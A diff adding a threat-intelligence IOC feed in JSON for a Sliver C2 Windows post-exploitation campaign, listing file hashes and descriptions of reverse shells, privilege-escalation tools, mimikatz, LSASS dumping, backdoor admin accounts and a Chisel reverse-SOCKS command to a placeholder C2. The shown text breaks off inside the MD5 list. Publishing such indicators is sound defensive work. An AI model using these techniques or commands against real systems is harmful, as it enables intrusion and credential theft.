@@ -1,0 +1,2066 @@
+{
+  "metadata": {
+    "malware_name": "Sliver C2 Windows Post-Exploitation Staging Kit",
+    "family": "Sliver (BishopFox) beacon, plus an EtherRAT-class Node.js bot with Ethereum-resolved C2",
+    "campaign_id": "Sliver-C2-Windows-PostEx-Staging-193.233.202.17",
+    "report_date": "2026-09-06",
+    "analyst": "The Hunters Ledger",
+    "confidence": "HIGH",
+    "tlp": "CLEAR",
+    "notes": "Derived from 81 files captured from an open directory, 77 static triage reports, one contained behavioural analysis and one statically decrypted installer chain. This infrastructure was previously published by Hunt.io on 2026-08-04 and the primary address was flagged by Huntress on 2026-05-21; the file hashes below are not first observations. Victim-side data is deliberately absent: no victim domain, hostname, account, credential or internal address appears anywhere in this feed."
+  },
+  "file_hashes": {
+    "sha256": [
+      {
+        "value": "06e29cf9ac468976f04208ea5e5563ce57f67ba42093750e967c87a14dad0978",
+        "filename": "ccenum2.ps1",
+        "type": "Script",
+        "file_size": 2296,
+        "confidence": "DEFINITE",
+        "description": "Token-impersonation AD enumeration and SMB share probing, iteration 2"
+      },
+      {
+        "value": "0f56c703e9b7ddeb90646927bac05a5c6d95308c8e13b88e5d4f4b572423e036",
+        "filename": "jp.exe",
+        "type": "PE executable",
+        "file_size": 347648,
+        "confidence": "HIGH",
+        "description": "Stock JuicyPotato, compiled 2018-08-10"
+      },
+      {
+        "value": "0f56ff5ce9d6732eaa67688af2c94a8f320fb85bf4cb04ba372b735858b9d49c",
+        "filename": "ws_shell52500.exe",
+        "type": "PE executable",
+        "file_size": 1942528,
+        "confidence": "DEFINITE",
+        "description": "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      },
+      {
+        "value": "136dd810f217c0dd70f8352328c2ea6c43865f8ef79713d77d68c1d9bdbf822d",
+        "filename": "gp_reflect.ps1",
+        "type": "Script",
+        "file_size": 560,
+        "confidence": "DEFINITE",
+        "description": "Fileless reflective .NET loader, downloads gp.b64 and loads in memory"
+      },
+      {
+        "value": "1411edc3a80165e4f2bffaa126d7389dfc978f54760c90d6e8fd5a04b69e258a",
+        "filename": "nc64.exe",
+        "type": "PE executable",
+        "file_size": 1942528,
+        "confidence": "HIGH",
+        "description": "Operator-built Go netcat clone, source /tmp/build_nc/main.go"
+      },
+      {
+        "value": "15f69ef1918db303ca2f92eec7f99768adf1195e6f6fe56492fae37cc735216a",
+        "filename": "ms16032.ps1",
+        "type": "Script",
+        "file_size": 9962,
+        "confidence": "DEFINITE",
+        "description": "Three-technique LPE chain incl. CVE-2016-0099, launches netcat reverse shell"
+      },
+      {
+        "value": "16d465948fed0a2cdf75aa0478d2f4038852e6cc07f3fac3b78ac0bb2eca8ff0",
+        "filename": "efspot.exe",
+        "type": "PE executable",
+        "file_size": 1560576,
+        "confidence": "HIGH",
+        "description": "Operator-written Go EfsPotato implementation"
+      },
+      {
+        "value": "173994299ea7cdf873fbbe1ec42953b8b45995f519f14bc702d0a7b9338efc32",
+        "filename": "adduser.ps1",
+        "type": "Script",
+        "file_size": 733,
+        "confidence": "DEFINITE",
+        "description": "Creates an AD account and adds it to Domain Admins"
+      },
+      {
+        "value": "201bcb3d98923856227ed102b5f92c5ebd268e715a9bfc2e62ba1fe7faa0bc5f",
+        "filename": "add_dns_publisherres.ps1",
+        "type": "Script",
+        "file_size": 196,
+        "confidence": "DEFINITE",
+        "description": "Plants an internal A record for the operator domain"
+      },
+      {
+        "value": "204affae86fda4fea1ceb24f3e95cd7ab457169d36e9df0f05775f123de2b31e",
+        "filename": "add_publisherresolution.ps1",
+        "type": "Script",
+        "file_size": 972,
+        "confidence": "DEFINITE",
+        "description": "Plants an internal A record for the operator domain, hardened variant"
+      },
+      {
+        "value": "28fad4e208ca97ba16180157bf7a565e1f6a40ebcb5900c0bda5a8947bafe66d",
+        "filename": "rragent.exe",
+        "type": "PE executable",
+        "file_size": 1802240,
+        "confidence": "DEFINITE",
+        "description": "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      },
+      {
+        "value": "294043345ec46527acf4c56635de6f781036aff1a1dbdc3925ba4525372633ee",
+        "filename": "da_shell_36.exe",
+        "type": "PE executable",
+        "file_size": 1943552,
+        "confidence": "DEFINITE",
+        "description": "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      },
+      {
+        "value": "2c8df3fdb19ea1884d32457a10049cb6ca80498e0e162b3b34977ad2b82fe6ed",
+        "filename": "dns_add_publisherres.ps1",
+        "type": "Script",
+        "file_size": 443,
+        "confidence": "DEFINITE",
+        "description": "Plants an internal A record for the operator domain, third variant"
+      },
+      {
+        "value": "2fc083274c15d5c87b3d769e797498f36e43dede21f48a21b53422c90d960f21",
+        "filename": "susan_task.b64",
+        "type": "Data",
+        "file_size": 516,
+        "confidence": "DEFINITE",
+        "description": "Base64 batch script creating a remote SYSTEM msiexec scheduled task"
+      },
+      {
+        "value": "31332d7417c777e7e52bd4d9c491cb6213c97ab16e051bf29eaf8b2a18c06ef4",
+        "filename": "inject_from_fs01.ps1",
+        "type": "Script",
+        "file_size": 1446,
+        "confidence": "DEFINITE",
+        "description": "Reads beacon shellcode from the victim file server over SMB and injects it"
+      },
+      {
+        "value": "318bb406f9cf61cf310c84706f090bdaad29d481a783a37be185bf709a791b4c",
+        "filename": "fix_uac.bat",
+        "type": "Script",
+        "file_size": 244,
+        "confidence": "DEFINITE",
+        "description": "Disables UAC and enables remote admin with local credentials"
+      },
+      {
+        "value": "3467dd1d846b46ab41dfc1111960f1a7ec54cf75d4a6339929d8448c477b0d35",
+        "filename": "s.exe",
+        "type": "PE executable",
+        "file_size": 1938944,
+        "confidence": "DEFINITE",
+        "description": "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      },
+      {
+        "value": "35c419760696d9013b31dafc5b05682e38ffa5190f631d3a3c5f1c3a1ad85b61",
+        "filename": "pb161_new.exe",
+        "type": "PE executable",
+        "file_size": 1945088,
+        "confidence": "DEFINITE",
+        "description": "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      },
+      {
+        "value": "37a28e5532cf7de88af570cdcbf6dc0db96b14c37ff84d285d89e6635ad91c05",
+        "filename": "ld.ps1",
+        "type": "Script",
+        "file_size": 910,
+        "confidence": "DEFINITE",
+        "description": "LSASS minidump via MiniDumpWriteDump to C:\\Windows\\Temp\\ls.dmp"
+      },
+      {
+        "value": "3953b770e1da9816e876e8df6b11e1e020e2f5cdad016da1d191e095ea628d80",
+        "filename": "webtitan_whitelist.ps1",
+        "type": "Script",
+        "file_size": 2639,
+        "confidence": "DEFINITE",
+        "description": "Whitelists operator domain through the DNS-filter appliance admin API"
+      },
+      {
+        "value": "39be3938eb198ab57802edcf67554dad007f01dd9148dadee39279bfd09cfee2",
+        "filename": "da_shell_12.exe",
+        "type": "PE executable",
+        "file_size": 1943552,
+        "confidence": "DEFINITE",
+        "description": "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      },
+      {
+        "value": "3d531def7ecef3f29b4542eb28db21e7ebae4da29c77cd762147135f5a014f87",
+        "filename": "ws37.exe",
+        "type": "PE executable",
+        "file_size": 1947136,
+        "confidence": "DEFINITE",
+        "description": "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      },
+      {
+        "value": "4104ed9fe73c3b582f8366751ad7c496c2b0f7a4a6b3f069802b5af9b5bd44ba",
+        "filename": "dep.ps1",
+        "type": "Script",
+        "file_size": 1099,
+        "confidence": "DEFINITE",
+        "description": "Deployment via Copy-Item with an explicit PSCredential"
+      },
+      {
+        "value": "42d5fc0c36977e0a4ad40ba0771b3cdc9bdd9c73c89d68844bc8e510c0657226",
+        "filename": "wt_whitelist.ps1",
+        "type": "Script",
+        "file_size": 2667,
+        "confidence": "DEFINITE",
+        "description": "DNS-filter whitelist plus DNS plant, discovers the API from the appliance JavaScript"
+      },
+      {
+        "value": "4352ad707e262d4913d690bc95eb3d38c72ff43100c9a7a96ce4cefa6705dabd",
+        "filename": "deploy.cmd",
+        "type": "Script",
+        "file_size": 1318,
+        "confidence": "DEFINITE",
+        "description": "MSI deployment with SMB then WMI plus certutil fallback"
+      },
+      {
+        "value": "467cb247fc8545a5b6be227853252b46984f94a54e8c4260932573304d61f6ce",
+        "filename": "task39_archive.xml",
+        "type": "Data",
+        "file_size": 3238,
+        "confidence": "DEFINITE",
+        "description": "Weekly SYSTEM scheduled task, fileless re-pull of the capstone script"
+      },
+      {
+        "value": "6016d1a56674d621dc8206c7162e3e30959f9bec930f30db2accf3601779bc9a",
+        "filename": "sys37.exe",
+        "type": "PE executable",
+        "file_size": 1941504,
+        "confidence": "DEFINITE",
+        "description": "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      },
+      {
+        "value": "607e0456e7022e5f9f4829b0a2c658f0834fb642be3ab7ce68ed009b01e06f97",
+        "filename": "ccenum.ps1",
+        "type": "Script",
+        "file_size": 2174,
+        "confidence": "DEFINITE",
+        "description": "Token-impersonation AD enumeration and SMB share probing"
+      },
+      {
+        "value": "61252f5123b38cf4db37f9171d94779013cdcdc553564b10a33ad9e3f1a75926",
+        "filename": "getsys.exe",
+        "type": "PE executable",
+        "file_size": 1074688,
+        "confidence": "HIGH",
+        "description": "Go stub, no hardcoded address recovered"
+      },
+      {
+        "value": "6172a5128528ee34147a9683f17192921c1059d8bddc66fbce46de8ddc33b556",
+        "filename": "task39_past.xml",
+        "type": "Data",
+        "file_size": 2346,
+        "confidence": "HIGH",
+        "description": "Scheduled task definition, SYSTEM, forged author, backdated trigger"
+      },
+      {
+        "value": "61c0810a23580cf492a6ba4f7654566108331e7a4134c968c2d6a05261b2d8a1",
+        "filename": "mimi64.exe",
+        "type": "PE executable",
+        "file_size": 1355264,
+        "confidence": "DEFINITE",
+        "description": "Stock mimikatz, compiled 2022-09-19"
+      },
+      {
+        "value": "68675be7d0b110878c4fd7682e2e72911c66a9c2b43df91266a0e647067d4954",
+        "filename": "wt_pg_whitelist.ps1",
+        "type": "Script",
+        "file_size": 1925,
+        "confidence": "DEFINITE",
+        "description": "DNS-filter appliance reconnaissance, PostgreSQL probe and API mapping"
+      },
+      {
+        "value": "689036d2dc675b3d95a4139b8097685f6e2e5c8520e7a5a615801aba00a8b85a",
+        "filename": "ws35.exe",
+        "type": "PE executable",
+        "file_size": 1947136,
+        "confidence": "DEFINITE",
+        "description": "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      },
+      {
+        "value": "69cd12d92acf261c7f738c92d09e39dbcf60ec6ad66b261924b3dc93178b5ed3",
+        "filename": "deploy_all.bat",
+        "type": "Script",
+        "file_size": 1103,
+        "confidence": "DEFINITE",
+        "description": "Implant deployment via certutil to an internal host list"
+      },
+      {
+        "value": "6a7d945fccd3f739e3f54efd5624240c9a1b80de81b859756bb2207f4d044003",
+        "filename": "task39_exec.xml",
+        "type": "Data",
+        "file_size": 2208,
+        "confidence": "HIGH",
+        "description": "Scheduled task definition, SYSTEM, forged author"
+      },
+      {
+        "value": "728c38979cdda97d5e82ece602698bf5132725f9f28b8cc0bc5fbd2316c9a044",
+        "filename": "run_chisel.bat",
+        "type": "Script",
+        "file_size": 60,
+        "confidence": "DEFINITE",
+        "description": "Chisel reverse SOCKS launcher, csvc.exe client <C2>:22673 R:socks"
+      },
+      {
+        "value": "731c9bfeb6816b6acb79cabf7edfeee3b7177c5f3dc76803c5907d7bf8cee808",
+        "filename": "da_shell_39.exe",
+        "type": "PE executable",
+        "file_size": 1943552,
+        "confidence": "DEFINITE",
+        "description": "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      },
+      {
+        "value": "756c2096f54c5497110c9d854625c3ed592873e566d532077cd7adb4d10d4add",
+        "filename": "ws_3srv.exe",
+        "type": "PE executable",
+        "file_size": 1947136,
+        "confidence": "DEFINITE",
+        "description": "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      },
+      {
+        "value": "79bb633438d8e9c67b0ee55925d5fa2e81880ddb872c89f957935b001c56a9a4",
+        "filename": "task_useradd.xml",
+        "type": "Data",
+        "file_size": 2708,
+        "confidence": "HIGH",
+        "description": "Scheduled task form of the backdoor account creation"
+      },
+      {
+        "value": "7a1b0508afe806ce7f0ace0894cf46d159466f6874d5271a39e2c149c6ec4b9f",
+        "filename": "dep3.bat",
+        "type": "Script",
+        "file_size": 975,
+        "confidence": "DEFINITE",
+        "description": "Deployment via xcopy, byte-identical to dep4/5/6/7"
+      },
+      {
+        "value": "7f91141bba37457b09088b039e21d82abe420bdc3b585970dba71dfe5cbeb25d",
+        "filename": "s443tls.exe",
+        "type": "PE executable",
+        "file_size": 3927040,
+        "confidence": "DEFINITE",
+        "description": "Go stub with hardcoded C2 on 443, TLS-capable, 28 capability rules"
+      },
+      {
+        "value": "81d5debff647121e47913098757214ddd163710a240224fa92a03af9623ecf81",
+        "filename": "dep8.bat",
+        "type": "Script",
+        "file_size": 936,
+        "confidence": "DEFINITE",
+        "description": "Deployment via xcopy, CRLF line endings"
+      },
+      {
+        "value": "8524fbc0d73e711e69d60c64f1f1b7bef35c986705880643dd4d5e17779e586d",
+        "filename": "ps64.exe",
+        "type": "PE executable",
+        "file_size": 27136,
+        "confidence": "HIGH",
+        "description": "Stock PrintSpoofer"
+      },
+      {
+        "value": "8823f98a6774b1dc812687476e0866f31b1601f4c42b880bd9a7f57a309d27b4",
+        "filename": "add_dns_from_37.ps1",
+        "type": "Script",
+        "file_size": 523,
+        "confidence": "DEFINITE",
+        "description": "Plants the internal A record remotely over WinRM"
+      },
+      {
+        "value": "88ad6a37051cbaef75de8c6e3fe22351df40ba064677a6a3f53d4cc156ad1eb6",
+        "filename": "da_shell_37.exe",
+        "type": "PE executable",
+        "file_size": 1943552,
+        "confidence": "DEFINITE",
+        "description": "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      },
+      {
+        "value": "921376cf81f2a5eca3d9b44cdb6ff2df0a1a685bf47518d5f86e45576c997b60",
+        "filename": "arc39_new.exe",
+        "type": "PE executable",
+        "file_size": 1945088,
+        "confidence": "DEFINITE",
+        "description": "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      },
+      {
+        "value": "978c9818e766f1df9c3e7b4ad3a3f2df4ef204524b9ad8e45154311148b057db",
+        "filename": "ws_new31847.exe",
+        "type": "PE executable",
+        "file_size": 1944576,
+        "confidence": "DEFINITE",
+        "description": "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      },
+      {
+        "value": "97c90575e9d2209d40e38a31d2aafd543a9f09d52b2e329c1e2206472886a895",
+        "filename": "task39.xml",
+        "type": "Data",
+        "file_size": 3242,
+        "confidence": "HIGH",
+        "description": "Scheduled task definition, SYSTEM, forged author"
+      },
+      {
+        "value": "9a8e9d587b570d4074f1c8317b163aa8d0c566efd88f294d9d85bc7776352a28",
+        "filename": "gp.exe",
+        "type": "PE executable",
+        "file_size": 57344,
+        "confidence": "DEFINITE",
+        "description": "Stock GodPotato, .NET x86"
+      },
+      {
+        "value": "9bc742d339a08ff88ae26363bd9b73cf027762f1856e0e7f30d86feccfb5c3ef",
+        "filename": "da_shell_173.exe",
+        "type": "PE executable",
+        "file_size": 1943552,
+        "confidence": "DEFINITE",
+        "description": "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      },
+      {
+        "value": "9e5f7294234e21b3be083bb875d27f51514cf158e507ae11594459d9cc879f58",
+        "filename": "s443.exe",
+        "type": "PE executable",
+        "file_size": 1938944,
+        "confidence": "DEFINITE",
+        "description": "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      },
+      {
+        "value": "a2363e2f464694cb4bb8f487d33ea378764790a1c742bce98a03db5f52f4cd06",
+        "filename": "svcload.exe",
+        "type": "PE executable",
+        "file_size": 43520,
+        "confidence": "DEFINITE",
+        "description": "Operator-modified PrintSpoofer derivative, stack-built strings, real build timestamp 2026-04-16"
+      },
+      {
+        "value": "a53150f1214665cf8122a3fa2f953c863be2f5c0f81a0d25f603a91689f713eb",
+        "filename": "da_shell_35.exe",
+        "type": "PE executable",
+        "file_size": 1943552,
+        "confidence": "DEFINITE",
+        "description": "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      },
+      {
+        "value": "a95da28fd2c077f7bbafe536b3821efd55f7d73ade8a8b5337327f11c5ef44ca",
+        "filename": "svcefs.exe",
+        "type": "PE executable",
+        "file_size": 15360,
+        "confidence": "DEFINITE",
+        "description": "EfsPotato, calls EfsRpcEncryptFileSrv, .NET x86"
+      },
+      {
+        "value": "aaec49b549aecf2119e1d20bf6dd7efbd74cd2ed2f6aaefed39e780e0815b5d4",
+        "filename": "deploy2.cmd",
+        "type": "Script",
+        "file_size": 608,
+        "confidence": "DEFINITE",
+        "description": "MSI deployment to a host subset via certutil and msiexec"
+      },
+      {
+        "value": "acfe23f94e5b98a217a93bf414c8f1a99d0463b1d143fff7a3ab5dae436fe19c",
+        "filename": "inject_fs_v2.ps1",
+        "type": "Script",
+        "file_size": 1458,
+        "confidence": "DEFINITE",
+        "description": "Second iteration of the SMB-sourced shellcode injector"
+      },
+      {
+        "value": "b0e31e430faecdb65f1df82502506f4b155e11c2f2bf53e5014ffb5ce1ed8f75",
+        "filename": "ws36.exe",
+        "type": "PE executable",
+        "file_size": 1947136,
+        "confidence": "DEFINITE",
+        "description": "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      },
+      {
+        "value": "b5c056a04d77c781b06dd3f2c8cbc13fadcdd9d78644755d82f322d3b7806f70",
+        "filename": "pb39_new.exe",
+        "type": "PE executable",
+        "file_size": 1943552,
+        "confidence": "DEFINITE",
+        "description": "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      },
+      {
+        "value": "bd61c2880920bbfb86c12df439dd1ca0258a10e532433698fd029aef2a5b33f2",
+        "filename": "svchost_update.exe",
+        "type": "PE executable",
+        "file_size": 37110784,
+        "confidence": "DEFINITE",
+        "description": "Sliver beacon implant, symbol-obfuscated Go PE64"
+      },
+      {
+        "value": "c115b1a69fe49cab4826a3f05ec5e37c693c135e8ea8c5f6492c0bc8c475f1b3",
+        "filename": "gp_run.ps1",
+        "type": "Script",
+        "file_size": 537,
+        "confidence": "HIGH",
+        "description": "Pre-staged reflective .NET loader, reads gp.b64 from disk"
+      },
+      {
+        "value": "c1761a1b640f2bb1a0140923e255f26ad9b79a9005475ff1551e9a297a48811c",
+        "filename": "download_and_exec.ps1",
+        "type": "Script",
+        "file_size": 162,
+        "confidence": "DEFINITE",
+        "description": "Generic downloader from the operator staging port"
+      },
+      {
+        "value": "cef3e10ae4735a7017b3fe982d7385e3c3ce0cde286fb7572dbf885df73f8041",
+        "filename": "gp.b64",
+        "type": "Data",
+        "file_size": 76460,
+        "confidence": "DEFINITE",
+        "description": "Base64 transport encoding of gp.exe"
+      },
+      {
+        "value": "d13c5f858a8add3ff968a382a85f2dbe8e9fb0283086163d27b69178e4d5ee36",
+        "filename": "acl_enum.ps1",
+        "type": "Script",
+        "file_size": 3384,
+        "confidence": "DEFINITE",
+        "description": "Token-impersonation AD enumeration hunting adminCount=1 accounts"
+      },
+      {
+        "value": "d546e500ef662b2c0def984b233e37c4b11de28bf5280df24d1d3300a7fa7b84",
+        "filename": "chisel.exe",
+        "type": "Data",
+        "file_size": 14937515,
+        "confidence": "DEFINITE",
+        "description": "Chisel v1.11.5 Linux ELF, the operator-side tunnel server"
+      },
+      {
+        "value": "d7028280e815612b893c6f0620a4fa2ae63aa5c5bba9988b5223b81b7bf21798",
+        "filename": "ligolo_agent.exe",
+        "type": "PE executable",
+        "file_size": 7249408,
+        "confidence": "DEFINITE",
+        "description": "Ligolo-ng agent, Go 1.24.0"
+      },
+      {
+        "value": "e122fb629f5f09789d83ef1b8b41238d329f7d8efd84d38080d01bef2bad5d8b",
+        "filename": "svc37.exe",
+        "type": "PE executable",
+        "file_size": 1941504,
+        "confidence": "DEFINITE",
+        "description": "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      },
+      {
+        "value": "e788f829b1a0141a488afb5f82b94f13035623609ca3b83f0c6985919cd9e83b",
+        "filename": "chisel_new.exe",
+        "type": "PE executable",
+        "file_size": 9760768,
+        "confidence": "DEFINITE",
+        "description": "Chisel v1.11.5 Windows PE client"
+      },
+      {
+        "value": "eaec6a177523f2effbabbba6159fe886d284e246e7b1464eb137ae9481ed65ca",
+        "filename": "upd443.exe",
+        "type": "PE executable",
+        "file_size": 1943552,
+        "confidence": "DEFINITE",
+        "description": "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      },
+      {
+        "value": "ee6807a8abfabced22ee026e178a28da64d13cc3408e224394ff6e5782fb9e1d",
+        "filename": "cons_c1.0.1.msi",
+        "type": "MSI (OLE2 compound file)",
+        "file_size": 26624,
+        "confidence": "DEFINITE",
+        "description": "MSI installer for the Node.js bot with Ethereum-resolved C2"
+      },
+      {
+        "value": "eee674bd0bcd2416367ad692e72122de31b710f13f35e2ceb8a52317920d00ca",
+        "filename": "dep4.bat",
+        "type": "Script",
+        "file_size": 969,
+        "confidence": "DEFINITE",
+        "description": "Deployment via xcopy"
+      },
+      {
+        "value": "f03e1d0951f4d0744939a0cc7da7730ab367ec9420c1a77cc7f97dc0932de652",
+        "filename": "inject_sliver.ps1",
+        "type": "Script",
+        "file_size": 1665,
+        "confidence": "DEFINITE",
+        "description": "Downloads beacon shellcode and injects it, bypassing the configured proxy"
+      },
+      {
+        "value": "f4c87a1df04274b7497cbf9a4619b946c915cf5210b6e2eaa2fee1629f4ff196",
+        "filename": "update.exe",
+        "type": "PE executable",
+        "file_size": 1947136,
+        "confidence": "DEFINITE",
+        "description": "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      },
+      {
+        "value": "f609621698eaad8c4683750fe8bd0e242349be3eea408da593151ff877ed8ab6",
+        "filename": "task_39.ps1",
+        "type": "Script",
+        "file_size": 3787,
+        "confidence": "DEFINITE",
+        "description": "Capstone attack chain: backdoor account, RDP, EDR disable, hive exfil, tunnel, reverse shell"
+      },
+      {
+        "value": "fa046adb30d00c56d640419a12deef8395ff5d40d6e083c1c8388ebd7b435ef4",
+        "filename": "dep2.ps1",
+        "type": "Script",
+        "file_size": 1016,
+        "confidence": "DEFINITE",
+        "description": "Deployment via a mapped drive"
+      },
+      {
+        "value": "fb94688ed37dfcb985a8a4d720230e5150956e1788d579b0a54b53a153fd2f2e",
+        "filename": "slv_beacon_sc.bin",
+        "type": "Data",
+        "file_size": 19289912,
+        "confidence": "HIGH",
+        "description": "Raw Sliver beacon shellcode, entropy 7.9999"
+      },
+      {
+        "value": "fdf0fae99d3b8ddd21aac288c2b38b6ac8a0e0eff99706b82ed5e921db9ddb0e",
+        "filename": "assa161_new.exe",
+        "type": "PE executable",
+        "file_size": 1945088,
+        "confidence": "DEFINITE",
+        "description": "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      },
+      {
+        "value": "fe54dbceee81d09d3d2881136f8a702423f9c25acf4fd8fea44b36111134eaf4",
+        "filename": "task39_now.xml",
+        "type": "Data",
+        "file_size": 3458,
+        "confidence": "HIGH",
+        "description": "Scheduled task definition, SYSTEM, forged author"
+      },
+      {
+        "value": "86881b8e9d197ac2f734792de48d5dfaebe7cafb6e35d49c5dd7fe6eb697230e",
+        "filename": "cons_c1.0.1.msi decrypted stage 3 payload",
+        "type": "JavaScript (Node.js)",
+        "confidence": "HIGH",
+        "description": "Node.js bot decrypted statically from the MSI payload. Build-specific: the bot posts its own source to the C2 on first run and runs a server-generated re-obfuscated copy thereafter, so this hash will not match across victims"
+      },
+      {
+        "value": "a332835be163d968d287f2c6ff566d75b087abcedc16021607403803b7b3416e",
+        "filename": "bkshell.exe",
+        "type": "PE executable",
+        "confidence": "MODERATE",
+        "description": "Not in the captured directory. Placed in the beacon family by appearing among the files communicating with the secondary operator address alongside two binaries independently shown to carry it"
+      },
+      {
+        "value": "bcf24d50ca3a2b4e74438537755a1778617bdf02273098b82a3ce5e89bf5724b",
+        "filename": "rtunnel2.exe",
+        "type": "PE executable",
+        "confidence": "LOW",
+        "description": "Not in the captured directory. Low-detection tunnelling variant tied to the primary host by relationship data only, with no second line of evidence"
+      }
+    ],
+    "md5": [
+      {
+        "value": "a03253a991d34640f00c560b89011805",
+        "filename": "ccenum2.ps1"
+      },
+      {
+        "value": "808502752ca0492aca995e9b620d507b",
+        "filename": "jp.exe"
+      },
+      {
+        "value": "1e309fc39e9866edf6f44fa315fbdf70",
+        "filename": "ws_shell52500.exe"
+      },
+      {
+        "value": "999466cff181b66907c6fc2d80f5c8b3",
+        "filename": "gp_reflect.ps1"
+      },
+      {
+        "value": "0316840f7df8f75c4039909d55eb1549",
+        "filename": "nc64.exe"
+      },
+      {
+        "value": "0f25cb54d2dc89b414a14db202b06ba6",
+        "filename": "ms16032.ps1"
+      },
+      {
+        "value": "621db49ebc24092045d7181cf8690cf3",
+        "filename": "efspot.exe"
+      },
+      {
+        "value": "130b72b54799233f0aeb203f160ebc90",
+        "filename": "adduser.ps1"
+      },
+      {
+        "value": "6776bfe983932598134e3eb1a2d99d14",
+        "filename": "add_dns_publisherres.ps1"
+      },
+      {
+        "value": "f4f4467128df3962670243b5b0b99f8c",
+        "filename": "add_publisherresolution.ps1"
+      },
+      {
+        "value": "efa54088ecb950d5ee152610ff5d636e",
+        "filename": "rragent.exe"
+      },
+      {
+        "value": "d766a554e5ab46a43b848b0d22df65f1",
+        "filename": "da_shell_36.exe"
+      },
+      {
+        "value": "868f2d9f2ea65e6e0ed6a66133ec3468",
+        "filename": "dns_add_publisherres.ps1"
+      },
+      {
+        "value": "04262ed28fd9b4f4691b2655b2f5c0ed",
+        "filename": "susan_task.b64"
+      },
+      {
+        "value": "3c916891a76120c4e10ab4674a8d5720",
+        "filename": "inject_from_fs01.ps1"
+      },
+      {
+        "value": "1b62875e961999bd2157ac88de6e83de",
+        "filename": "fix_uac.bat"
+      },
+      {
+        "value": "a39eb85eb5622a28e0e368fefa9da939",
+        "filename": "s.exe"
+      },
+      {
+        "value": "6084305556def1a61dd69959884af971",
+        "filename": "pb161_new.exe"
+      },
+      {
+        "value": "33172fc2d6e7615b7ca75a493447b4ce",
+        "filename": "ld.ps1"
+      },
+      {
+        "value": "098989965749e8d42a314f5ae102b82a",
+        "filename": "webtitan_whitelist.ps1"
+      },
+      {
+        "value": "7ba3108234b3556a7b536bee391143a3",
+        "filename": "da_shell_12.exe"
+      },
+      {
+        "value": "29ea4a5c24c739727d46941a471f80d2",
+        "filename": "ws37.exe"
+      },
+      {
+        "value": "ade6fecfa408be036364e2b9b15441ae",
+        "filename": "dep.ps1"
+      },
+      {
+        "value": "bf1e31c305f210ed15f2635ca1ae321e",
+        "filename": "wt_whitelist.ps1"
+      },
+      {
+        "value": "2000c9cd74d0770a4cfd97282cdc9abd",
+        "filename": "deploy.cmd"
+      },
+      {
+        "value": "dd5c8c955b2fa584e2c7e17c6f4f1455",
+        "filename": "task39_archive.xml"
+      },
+      {
+        "value": "049002830b73321e8efce7899d4eaa92",
+        "filename": "sys37.exe"
+      },
+      {
+        "value": "49017561ae06882b7ff28d66783e2051",
+        "filename": "ccenum.ps1"
+      },
+      {
+        "value": "712da3dbc5ea34854345e71bb8d98ea8",
+        "filename": "getsys.exe"
+      },
+      {
+        "value": "f5639c56f86b715f6223c7a14c06d519",
+        "filename": "task39_past.xml"
+      },
+      {
+        "value": "29efd64dd3c7fe1e2b022b7ad73a1ba5",
+        "filename": "mimi64.exe"
+      },
+      {
+        "value": "90fe1319b8b05eb5e782fb334f5c2924",
+        "filename": "wt_pg_whitelist.ps1"
+      },
+      {
+        "value": "11553dc59be466f48fed7dbb436ff05f",
+        "filename": "ws35.exe"
+      },
+      {
+        "value": "57bc34640bc2d53d7e4d2a053d0bbea3",
+        "filename": "deploy_all.bat"
+      },
+      {
+        "value": "68608c531dd4240e7f5a5dd0cb2a3610",
+        "filename": "task39_exec.xml"
+      },
+      {
+        "value": "97b8693e32bfa03dd7eabd701849d972",
+        "filename": "run_chisel.bat"
+      },
+      {
+        "value": "b531927f303aed4fa98c9e42b9c5eca7",
+        "filename": "da_shell_39.exe"
+      },
+      {
+        "value": "aa68d12c3135afbdc019739ef1d21358",
+        "filename": "ws_3srv.exe"
+      },
+      {
+        "value": "5e7fc055d261c685d3aa05aca81e610f",
+        "filename": "task_useradd.xml"
+      },
+      {
+        "value": "3b8b9c081499c90e13e8916513bb8a28",
+        "filename": "dep3.bat"
+      },
+      {
+        "value": "f665292c392bffa3bebbe17dcec03e17",
+        "filename": "s443tls.exe"
+      },
+      {
+        "value": "2df218a390e8fe1cf17797f2c5caec29",
+        "filename": "dep8.bat"
+      },
+      {
+        "value": "108da75de148145b8f056ec0827f1665",
+        "filename": "ps64.exe"
+      },
+      {
+        "value": "02bcdf44e34cd9aca5abf617427d7bfb",
+        "filename": "add_dns_from_37.ps1"
+      },
+      {
+        "value": "dfdf55484962e2a70a6255868d91bc37",
+        "filename": "da_shell_37.exe"
+      },
+      {
+        "value": "0b43d183fa64803608385806501750a7",
+        "filename": "arc39_new.exe"
+      },
+      {
+        "value": "4ff3ed6143b932a8760c32cb693905a9",
+        "filename": "ws_new31847.exe"
+      },
+      {
+        "value": "c8a7a1e830d6850b2529471310d1c803",
+        "filename": "task39.xml"
+      },
+      {
+        "value": "1fdb1dd742674d3939f636c3fc4b761f",
+        "filename": "gp.exe"
+      },
+      {
+        "value": "71e5be231b66e94ab0cfc20be0b1e1ba",
+        "filename": "da_shell_173.exe"
+      },
+      {
+        "value": "c6cd2ac9aaa07392b5a18cea0b465bf4",
+        "filename": "s443.exe"
+      },
+      {
+        "value": "4d9e61fe5d105e4d6d26ac67f7228742",
